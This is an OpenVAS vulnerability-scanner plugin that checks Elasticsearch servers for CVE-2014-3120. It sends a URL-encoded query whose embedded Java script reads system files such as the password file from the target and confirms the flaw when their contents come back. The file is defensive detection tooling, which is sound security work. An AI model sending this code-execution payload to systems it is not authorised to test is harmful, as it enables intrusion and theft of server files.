###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_elastisearch_code_execution_05_14.nasl 10833 2018-08-08 10:35:26Z cfischer $
#
# Elastisearch Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:elasticsearch:elasticsearch";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105032");
  script_cve_id("CVE-2014-3120");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 10833 $");
  script_name("Elastisearch Remote Code Execution Vulnerability");
  script_xref(name:"URL", value:"http://bouk.co/blog/elasticsearch-rce/");
  script_tag(name:"last_modification", value:"$Date: 2018-08-08 12:35:26 +0200 (Wed, 08 Aug 2018) $");
  script_tag(name:"creation_date", value:"2014-05-22 15:28:00 +0200 (Thu, 22 May 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_elastsearch_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 9200);
  script_mandatory_keys("elasticsearch/installed");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response");

  script_tag(name:"insight", value:"Elasticsearch has a flaw in its default configuration which makes
  it possible for any webpage to execute arbitrary code on visitors with Elasticsearch installed.");

  script_tag(name:"solution", value:"Ask the vendor for an update or disable 'dynamic scripting'");

  script_tag(name:"summary", value:"Elasticsearch is prone to a remote-code-execution vulnerability.");

  script_tag(name:"affected", value:"Elasticsearch < 1.2");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("host_details.inc");
include("http_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 ); # To have a reference to the Detection-NVT

files = traversal_files();

foreach file ( keys( files ) )
{
  lf = str_replace( string:files[file], find:"\\", replace:"/");
  lf = str_replace( string:files[file], find:"/", replace:"%2F");

  ex = '%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22' +
       'match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22OpenVAS%22%3A%7B' +
       '%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20'  +
       'Scanner(new%20File(%5C%22%2F' + lf + '%5C%22)).useDelimiter(%5C%22%5C%5C%5C' +
       '%5CZ%5C%22).next()%3B%22%7D%7D%7D';

  url = '/_search?source=' + ex + '&callback=?';

  req = http_get( item:url, port:port);
  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

  if( "OpenVAS" >< buf &&  egrep( pattern:file, string: buf ) )
  {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }

}

exit( 99 );
